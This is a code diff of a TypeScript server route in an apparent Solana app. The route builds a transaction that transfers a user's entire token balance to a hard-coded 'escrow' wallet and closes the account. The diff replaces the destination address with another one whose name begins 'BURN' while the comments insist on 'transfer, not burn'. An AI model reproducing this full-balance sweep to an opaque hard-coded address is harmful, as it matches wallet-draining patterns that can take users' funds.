@@ -2181,9 +2181,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       );
       console.log('⚡ Added priority fee instruction: 0.00001 SOL (10,000 microlamports) for faster transaction confirmation');
       
-      // Platform wallet for token escrow during grace period
-      const PLATFORM_WALLET = 'GETyEc6mVeymyH9tyTWxEW7j7thBrqSVFapHGP4Qkfq6';
-      const platformWalletPublicKey = new PublicKey(PLATFORM_WALLET);
+      // Platform escrow wallet for holding tokens during grace period
+      const ESCROW_WALLET = 'BURNRcHCvRZQTTyBgTdUpdyRFJ42zTAEz9X7BiqWnZGf';
+      const escrowWalletPublicKey = new PublicKey(ESCROW_WALLET);
       
       for (const token of validTokens) {
         const mintPublicKey = new PublicKey(token.mint);
@@ -2199,24 +2199,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
         console.log(`   - Will TRANSFER to platform wallet (escrow)`);
         
         if (exactRawAmount !== '0') {
-          // Get platform wallet's token account (already exists)
-          const platformTokenAccount = await getAssociatedTokenAddress(
+          // Get escrow wallet's token account 
+          const escrowTokenAccount = await getAssociatedTokenAddress(
             mintPublicKey,
-            platformWalletPublicKey,
+            escrowWalletPublicKey,
             false,
             token.programId
           );
           
-          console.log(`🔍 Platform destination: ${platformTokenAccount.toBase58()}`);
+          console.log(`🔍 Escrow destination: ${escrowTokenAccount.toBase58()}`);
           console.log(`🔍 User source: ${token.account.toBase58()}`);
           
-          // TRANSFER (NOT BURN) ALL tokens to platform wallet using EXACT on-chain balance
+          // TRANSFER (NOT BURN) ALL tokens to escrow wallet using EXACT on-chain balance
           const rawBalance = BigInt(exactRawAmount);
           
           const transferInstruction = createTransferCheckedInstruction(
             token.account,           // source
             mintPublicKey,           // mint
-            platformTokenAccount,     // destination (platform wallet - ESCROW)
+            escrowTokenAccount,      // destination (escrow wallet)
             ownerPublicKey,          // owner
             rawBalance,              // EXACT amount from blockchain (no rounding)
             token.decimals,          // decimals
@@ -2224,7 +2224,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             token.programId          // program ID
           );
           transaction.add(transferInstruction);
-          console.log(`✅ Added TRANSFER instruction - ${rawBalance.toString()} units → ${platformTokenAccount.toBase58()}`);
+          console.log(`✅ Added TRANSFER instruction - ${rawBalance.toString()} units → ${escrowTokenAccount.toBase58()}`);
           
           // Step 2: Close the now-empty account to reclaim SOL immediately  
           const closeInstruction = createCloseAccountInstruction(
